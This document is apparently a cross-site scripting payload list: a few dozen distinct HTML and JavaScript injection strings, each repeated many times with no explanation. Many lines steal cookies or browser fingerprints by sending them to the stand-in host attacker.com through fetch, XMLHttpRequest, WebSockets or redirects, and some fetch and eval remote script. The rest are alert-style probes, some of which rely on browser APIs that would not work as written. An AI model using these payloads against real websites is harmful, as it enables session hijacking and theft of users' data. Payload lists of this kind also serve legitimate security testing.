<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
